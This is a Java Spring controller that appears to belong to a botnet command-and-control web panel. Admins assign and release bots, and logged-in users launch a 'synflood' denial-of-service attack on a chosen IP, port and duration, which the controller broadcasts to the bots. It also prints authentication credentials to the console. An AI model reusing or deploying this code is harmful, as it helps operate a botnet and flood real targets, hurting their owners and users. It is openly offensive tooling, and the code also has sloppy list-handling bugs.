package cs.sii.controller;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.validation.Valid;

import org.apache.http.HttpStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.authentication.AuthenticationTrustResolver;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.web.authentication.rememberme.PersistentTokenBasedRememberMeServices;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.domain.LinkBot;
import cs.sii.domain.Target;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Controller
@RequestMapping("/site")
public class SiteController {

	@Autowired
	private Config configEngine;

	@Autowired
	AuthenticationTrustResolver authenticationTrustResolver;

	@Autowired
	PersistentTokenBasedRememberMeServices persistentTokenBasedRememberMeServices;

	@Autowired
	UserServiceImpl uServ;

	@Autowired
	RoleServiceImpl rServ;

	@Autowired
	BotServiceImpl bServ;

	@Autowired
	private Commando cmm;

	/**
	 * @param error
	 * @return
	 * @throws IOException
	 */
	@RequestMapping(value = "/login", method = RequestMethod.GET)
	public String login(HttpServletResponse error, HttpServletResponse httpServletResponse) throws IOException {
		String result = "";
		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
		System.out.println("ciccio stampa false "+configEngine.isCommandandconquerStatus());
		System.out.println(" "+ auth.getName());
		if (configEngine.isCommandandconquerStatus()) {
			
					result = "login";
				
			}
		
		return result;

	}

	
	

	@RequestMapping(value = "/index", method = RequestMethod.GET)
	public String index(HttpServletResponse error, HttpServletResponse httpServletResponse) throws IOException {
		String result = "redirect:/site/login";
		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
		System.out.println("ciccio stampa false "+configEngine.isCommandandconquerStatus());
		System.out.println(" "+ auth.getName());
		System.out.println(" "+ auth.getPrincipal().toString());
		if(auth.getCredentials()!=null)
		System.out.println(" "+ auth.getCredentials().toString());

		User usr =uServ.findBySsoId(auth.getName());
		if(usr!=null)
			System.out.println(usr.getFirstName());
		else System.out.println("user not found");

		if (configEngine.isCommandandconquerStatus()) {
			
				System.out.println("sei qualcuno");
				Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
				for (GrantedAuthority gA : x) {
					System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
					if (gA.toString().contains("ROLE_ADMIN")) {
						System.out.println("ADMIN ACCEPTED");
						result = "redirect:/site/admin/index";
					}
					if (gA.toString().contains("ROLE_USER")) {
						System.out.println("USER ACCEPTED");
						result = "redirect:/site/user/index";
					}
				}
			}
		
		return result;

	}
	
	@PreAuthorize("hasRole('ROLE_USER')")
	@RequestMapping(value = "/user/index", method = RequestMethod.GET)
	public String indexUser(HttpServletResponse error) throws IOException {
		String result = "";
		if (configEngine.isCommandandconquerStatus()) {
			result = "indexuser";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return result;
	}
	@PreAuthorize("hasRole('ROLE_ADMIN')")

	@RequestMapping(value = "/admin/index", method = RequestMethod.GET)
	public String indexAdmin(HttpServletResponse error) throws IOException {
		String result = "";
		if (configEngine.isCommandandconquerStatus()) {
			result = "indexadmin";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return result;
	}

	/**
	 * This method handles logout requests. Toggle the handlers if you are
	 * RememberMe functionality is useless in your app.
	 * 
	 * @throws IOException
	 */
	@RequestMapping(value = "/logout", method = RequestMethod.GET)
	public String logoutPage(HttpServletRequest request, HttpServletResponse response, HttpServletResponse error) throws IOException {
		String result = "";
		if (configEngine.isCommandandconquerStatus()) {
			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
			if (auth != null) {
				persistentTokenBasedRememberMeServices.logout(request, response, auth);
				SecurityContextHolder.getContext().setAuthentication(null);
			}
			result = "redirect:/";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return result;
	}

	/**
	 * This method will provide the medium to add a new user.
	 */
	@RequestMapping(value = { "/user/showbot" }, method = RequestMethod.GET)
	public ModelAndView showBot() {
		ModelAndView mav = new ModelAndView("userbotlist");
		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
		String idUser = auth.getName();
		User usr = uServ.findBySsoId(idUser);
		List<Bot> botList = bServ.findAll();
		if (usr != null)
			if (botList != null) {
				for (Integer i = 0; i < botList.size(); i++) {
					Bot bot = botList.get(i);
					if (bot.getBotUser() != null) {
						if (!usr.equals(bot.getBotUser())) {
							botList.remove(bot);
						}
					} else
						botList.remove(bot);
				}
				mav.addObject("bots", botList);
			}
		return mav;
	}

	/**
	 * This method will provide the medium to add a new user.
	 */
	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.GET)
	public String addBot(ModelMap model) {
		model.addAttribute("linkBot", new LinkBot());
		List<Bot> botList = bServ.findAll();
		if (botList != null)
			for (Integer i = 0; i < botList.size(); i++) {
				Bot bot = botList.get(i);
				System.out.println("bot sadd" + bot.getIp() + " user ?null " + bot.getBotUser() == null);
				if (bot.getBotUser() != null||bot.getIp().equals(cmm.getnServ().getCommandConquerIps().get(0).getValue1().getIp()))
					botList.remove(bot);
			}
		model.addAttribute("bots", botList);
		model.addAttribute("users", uServ.findAll());
		return "addbot";
	}

	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.POST)
	public ModelAndView addBot(@ModelAttribute("linkBot") LinkBot lb) {
		Bot bot = bServ.searchBotID(lb.getIdBotL());
		User usr = uServ.findById(lb.getIdUsrL());
		bot.setBotUser(usr);
		bServ.updateBot(bot);
		String cmd = "setbot<BU>" + usr.getSsoId() + "<BU>" + bot.getIdBot();
		cmm.floodingByCecToBot(cmd, usr.getSsoId());
		return new ModelAndView("redirect:/site/admin/addbot");
	}

	/**
	 * This method will provide the medium to add a new user.
	 */
	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.GET)
	public String removeBot(ModelMap model) {
		model.addAttribute("usr", new User());
		model.addAttribute("users", uServ.findAll());

		return "deletebot";
	}

	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.POST)
	public ModelAndView removeBot(@ModelAttribute("usr") User usr) {
		usr = uServ.findById(usr.getId());
		List<Bot> botList = bServ.findAll();
		List<Bot> botList2 = new ArrayList<Bot>();
		if (botList != null)
			for (Integer i = 0; i < botList.size(); i++) {
				Bot bot = botList.get(i);
				if (bot.getBotUser() != usr) {
					botList.remove(bot);
				} else {
					bot.setBotUser(null);
					botList2.add(bot);
				}
				bServ.updateAll(botList2);
			}
		String cmd = "delbot<BU>" + usr.getSsoId();
		cmm.floodingByCecToBot(cmd, usr.getSsoId());
		return new ModelAndView("redirect:/site/admin/removeallbot");
	}

	/**
	 * This method will provide the medium to add a new user.
	 */
	@RequestMapping(value = { "/admin/newuser" }, method = RequestMethod.GET)
	public String newUser(ModelMap model) {
		User user = new User();
		model.addAttribute("roles", rServ.findAll());
		model.addAttribute("user", user);
		model.addAttribute("edit", false);
		model.addAttribute("loggedinuser", getPrincipal());
		return "registration";
	}

	/**
	 * This method will be called on form submission, handling POST request for
	 * saving user in database. It also validates the user input
	 */
	@RequestMapping(value = { "/admin/newuser" }, method = RequestMethod.POST)
	public String saveUser(@Valid User user, BindingResult result, ModelMap model) {

		if (result.hasErrors()) {
			System.out.println("1 " + result.toString());
			return "registration";
		}

		if (uServ.findBySsoId(user.getSsoId()) != null) {
			System.out.println("2");
			return "registration";
		} else {

			System.out.println("3 " + user.toString());

			uServ.saveCrypto(user);

			model.addAttribute("success", "User " + user.getFirstName() + " " + user.getLastName() + " registered successfully");
			model.addAttribute("loggedinuser", getPrincipal());
			return "registration";
		}
	}

	private String getPrincipal() {
		String userName = null;
		Object principal = SecurityContextHolder.getContext().getAuthentication().getPrincipal();

		if (principal instanceof UserDetails) {
			userName = ((UserDetails) principal).getUsername();
		} else {
			userName = principal.toString();
		}
		return userName;
	}

	/**
	 * This method returns true if users is already authenticated [logged-in],
	 * else false.
	 */
	private boolean isCurrentAuthenticationAnonymous() {
		final Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
		return authenticationTrustResolver.isAnonymous(authentication);
	}

	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.GET)
	public String attack(ModelMap model) {

		Target target = new Target();
		List<Target> attack = new ArrayList<Target>();
		attack.add(new Target("synflood"));

		model.addAttribute("listAttack", attack);
		model.addAttribute("target", target);

		return "attack";
	}

	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.POST)
	public ModelAndView choseAttack(@ModelAttribute("target") Target target, HttpServletResponse error) throws IOException {
		if (configEngine.isCommandandconquerStatus()) {
			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
			String idUser = auth.getName();
			System.out.println("Utente che sta iniziando un attacco " + idUser);
			String cmd = target.getTypeAttack() + "<TT>" + target.getIpDest() + "<TT>" + target.getPortDest() + "<TT>" + target.getTimeToAttack() + "<TT>" + idUser;
			cmm.floodingByUser(cmd, idUser);
			return new ModelAndView("redirect:/site/user/attack");
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
			return null;
		}
	}

}
